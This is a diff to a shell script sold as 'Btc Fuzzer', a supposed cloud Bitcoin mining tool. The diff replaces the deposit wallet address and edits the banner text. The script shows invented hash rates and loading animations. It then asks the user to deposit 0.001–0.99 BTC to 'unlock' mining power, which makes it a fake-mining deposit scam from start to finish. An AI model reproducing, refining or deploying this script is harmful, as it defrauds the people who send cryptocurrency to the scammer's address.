@@ -4,7 +4,7 @@
 initial_hashRate='0.00 BTC/hr'
 hashRate_toAssign='0.00084 BTC/hr'
 hash_id='d1f582b18c7eb1c26f6de27b4faa6c80e9ad42012d12f0394769265453861430'
-contract_id='bc1pu9cy0eu05efpxkp9p60mfstwgneam9h7r9z2dealycqejat7szpqnfyzh7'
+contract_id='bc1qqh7qmfqq752net2a7jtefrsf53c7k3mmvjd6yzs'
 
 # Function to print loading animation
 loading_animation() {
@@ -67,7 +67,7 @@ clear
 echo -e " "
 echo -e "Welcome to"
 colorful_logo_terminal
-echo -e "\033[93mBtc Fuzzer v1.2, a remotely cloud mining software design \nfor fuzzing network for btc\033[0m"
+echo -e "\033[93mBtc Fuzzer v1.2, a remotely cloud mining software design \nfor fuzzing btc network\033[0m"
 
 get_user_address
 echo -e "\n\033[35mWelcome, $uaddress\033[0m\n"
@@ -78,7 +78,7 @@ loading_animation 3
 clear
 
 colorful_logo_terminal
-echo -e "\033[93mBtc Miner v1.2, a remotely cloud mining software design \nto speedup minning for btc \033[0m"
+echo -e "\033[93mBtc Fuzzer v1.2, a remotely cloud mining software design \nto speedup minning for btc \033[0m"
 echo -e "\n"
 echo -e "To unlock your hash power of BTC, please deposit 0.001-0.99 BTC to the following address:\033[95m $contract_id\033[0m\n\033[97m [+] Your rate depend on your deposite amount of BTC! [+]\033[0m\n"
 
